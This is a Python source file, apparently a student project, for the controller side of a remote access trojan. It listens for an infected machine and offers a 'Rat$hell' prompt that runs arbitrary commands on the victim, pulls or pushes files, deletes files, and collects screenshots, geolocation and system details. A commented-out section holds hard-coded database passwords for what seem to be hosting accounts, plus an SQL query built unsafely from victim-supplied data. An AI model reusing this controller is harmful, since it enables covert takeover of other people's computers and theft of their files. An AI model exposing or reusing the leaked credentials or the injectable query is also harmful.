import socket
import time
import os
#import mysql.connector as mysql

socket.setdefaulttimeout(15)

os.system('color') #only on windows

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

listener.bind(('127.0.0.1', 80)) #Kali
#listener.bind(('192.168.56.1', 8888)) #windows

#wait for connection
listener.listen(1)
print('\nRunning Rat\033[92m$\033[0merver...')
connection, address = listener.accept()
print(f'\033[93m\nNew connection from {address[0]}\n\033[0m')

#update functio pythonin kautta yhteys tietokantaan (mysql)
# def update(data):
#     # data = json.loads(data)
#     data = data.split(",")
#     machine = data[0]
#     platform = data[1]
#     system = data[2]
#     ip = data[3]
#     processor = data[4]
#     python = data[5]

#     test = str(ip)

#     db = mysql.connect(host='localhost',user='root', password='', database='rat') #local
#     # db = mysql.connect(host='localhost',user='id18939757_ratmaster', password='UvM[{PV&5Of~iy^?', database='id18939757_rat')
#     # db = mysql.connect(host='fdb32.awardspace.net',user='4111041_rat', password='{p34gV7L8vpmH62*', database='4111041_rat')
#     cur = db.cursor()
#     # cur.execute(f"UPDATE info SET ip = '{ip}',name = '{machine}', WHERE id = '1'")
#     cur.execute(f"""UPDATE info SET ip = '{ip}',name = '{machine}',
# system = '{system}', processor = '{processor}', platform = '{platform}' WHERE id = '1'""")

#     db.commit()

#     cur.close()
#     db.close()

def clear_screen():
    os.system('cls')

#sending data
def send_data(output_data):
    size_of_data = str(len(output_data))
    connection.send(bytes(size_of_data,'utf8'))
    time.sleep(2)
    connection.send(output_data)
#receiving data
def recv_data():
    original_size = connection.recv(2048).decode('utf-8')
    original_size = int(original_size)
    data = connection.recv(2048)
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data
    
#mainloop
while True:
    cmd = input('Rat\033[1m\033[92m$\033[0mhell: ')
    connection.send(bytes(cmd, 'utf8'))
    if cmd == '':
        continue
    if cmd == 'exit':
        connection.close()
        listener.close()
        print('\nClosing Rat\033[92m$\033[0merver...\n')
        break
    elif cmd == 'cls':
        clear_screen()
        continue
    elif cmd[:2] == 'cd':
        result = recv_data().decode('utf8')
        print(result)
        continue
    elif cmd[:8] == 'download':
        file_output = recv_data()
        if file_output == b'not found':
            print('no file')
            continue
        with open(cmd[9:], 'wb') as write_data:
            write_data.write(file_output)
        continue
    elif cmd[:6] == 'upload':
        try:
            with open(cmd[7:], 'rb') as data:
                data_read = data.read()
        except FileNotFoundError:
            print('File not found')
        else:
            send_data(data_read)
        continue
    elif cmd == 'screen':
        print("taking screenshot")
        continue
    elif cmd[:6] == 'delete':
        print(recv_data().decode("utf-8"))
        continue

    elif cmd == 'geo':
        print(recv_data().decode("utf-8"))
        continue
    elif cmd == 'sysinfo':
        print(recv_data().decode("utf-8"))
        # info = recv_data().decode("utf-8")
        # info = json.loads(info)
        # print(info["hello"])
        continue
    # elif cmd == 'update':
    #     data = recv_data().decode("utf-8")
    #     update(data)
    #     continue
    elif cmd == 'help':
        print('\n\t***************************')
        print('\t*                         *')
        print('\t* all basic OS commands   *')
        print('\t* download <filename>     *')
        print('\t* upload <filename>       *')
        print('\t* screen for screenshot   *')
        print('\t* delete <filename>       *')
        print('\t* cd <path>               *')
        print('\t* exit                    *')
        print('\t* sysinfo                 *')
        print('\t* geo                     *')
        print('\t* update                  *')
        print('\t*                         *')
        print('\t* Keijo, Kai & AimoAnnos  *')
        print('\t*                         *')
        print('\t***************************\n')
        continue

    output = recv_data().decode('ISO-8859-1')
    print(output)
